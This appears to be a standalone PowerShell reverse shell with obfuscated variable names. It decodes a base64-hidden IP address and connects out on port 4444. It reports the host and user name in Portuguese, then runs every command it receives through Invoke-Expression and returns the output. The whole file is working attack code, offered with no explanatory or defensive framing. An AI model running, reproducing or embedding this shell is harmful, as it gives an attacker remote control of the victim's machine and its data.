try {
$CQFMsfKxtrsgNcx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTkyLjE2OC4yOS4xMQ=="))
$rsovi_ybpst_hxo = 4444
$CcDDVMiOPwURX = New-Object System.Net.Sockets.TCPClient($CQFMsfKxtrsgNcx, $rsovi_ybpst_hxo)
$qwyemjh = $CcDDVMiOPwURX.GetStream()
$nbr_dcckk = New-Object System.IO.StreamWriter($qwyemjh)
$tGoWPjSDY = New-Object System.IO.StreamReader($qwyemjh)
$csbnsi = "Conexão estabelecida de $env:COMPUTERNAME ($env:USERNAME)"
$nbr_dcckk.WriteLine($csbnsi)
$nbr_dcckk.Flush()
while ($CcDDVMiOPwURX.Connected) {
$nbr_dcckk.Write("SHELL> ")
$nbr_dcckk.Flush()
$ezswz_uckssq_lsxede = ""
while ($qwyemjh.DataAvailable -or $ezswz_uckssq_lsxede -eq "") {
if (-not $qwyemjh.DataAvailable) {
Start-Sleep -Milliseconds 100
continue
}
$ezswz_uckssq_lsxede = $tGoWPjSDY.ReadLine()
if ($ezswz_uckssq_lsxede -eq "exit") {
$CcDDVMiOPwURX.Close()
return
}
$MhwOtwaGGgQxnq = ""
try {
$MhwOtwaGGgQxnq = Invoke-Expression $ezswz_uckssq_lsxede 2>&1 | Out-String
} catch {
$MhwOtwaGGgQxnq = "[ERRO] " + $_.Exception.Message
}
$nbr_dcckk.WriteLine($MhwOtwaGGgQxnq)
$nbr_dcckk.Flush()
}
}
} catch {
} finally {
if ($nbr_dcckk) { $nbr_dcckk.Close() }
if ($tGoWPjSDY) { $tGoWPjSDY.Close() }
if ($qwyemjh) { $qwyemjh.Close() }
if ($CcDDVMiOPwURX) { $CcDDVMiOPwURX.Close() }
}
